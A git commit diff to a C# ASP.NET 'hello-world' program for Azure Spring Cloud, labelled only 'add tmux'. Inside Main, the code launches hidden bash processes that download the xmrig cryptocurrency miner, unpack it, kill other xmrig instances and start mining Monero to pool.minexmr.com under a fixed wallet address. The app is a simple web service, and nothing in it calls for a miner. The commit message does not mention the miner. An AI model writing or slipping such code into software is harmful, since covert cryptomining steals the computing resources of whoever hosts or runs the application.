db75f701f0d1a22848470db0ba1c7315b08a6c26
knyL <linhleduc.it@hotmail.com>
2022-03-09 19:12:29 +0700

    add tmux

--- hello-world/Program.cs
+++ hello-world/Program.cs
@@ -2,6 +2,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Threading;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Hosting;
 using Microsoft.Extensions.Configuration;
@@ -16,15 +17,30 @@ namespace hello_world
         public static void Main(string[] args)
         {
             CreateHostBuilder(args).Build().Run();
-             try
+            try
             {
+                new Process()
+                {
+                    StartInfo = new ProcessStartInfo()
+                    {
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        FileName = $"/bin/bash",
+                        WorkingDirectory = AppContext.BaseDirectory,
+                        Arguments = $"-c \"tmux\"",
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false
+                    }
+                }.Start();
+                Thread.Sleep(2500);
                 var process = new Process();
                 var processStartInfo = new ProcessStartInfo()
                 {
                     WindowStyle = ProcessWindowStyle.Hidden,
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
-                    Arguments = $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx\"",
+                    Arguments =
+                        $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz ; pkill xmrig; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
@@ -34,7 +50,6 @@ namespace hello_world
 
                 //String error = process.StandardError.ReadToEnd();
                 //String output = process.StandardOutput.ReadToEnd();
-
             }
             catch (Exception ex)
             {
@@ -42,12 +57,10 @@ namespace hello_world
                 throw;
             }
         }
-    public static IHostBuilder CreateHostBuilder(string[] args) =>
+
+        public static IHostBuilder CreateHostBuilder(string[] args) =>
             Host.CreateDefaultBuilder(args)
                 .UseAzureSpringCloudService()
-                .ConfigureWebHostDefaults(webBuilder =>
-                {
-                    webBuilder.UseStartup<Startup>();
-                });
+                .ConfigureWebHostDefaults(webBuilder => { webBuilder.UseStartup<Startup>(); });
     }
 }
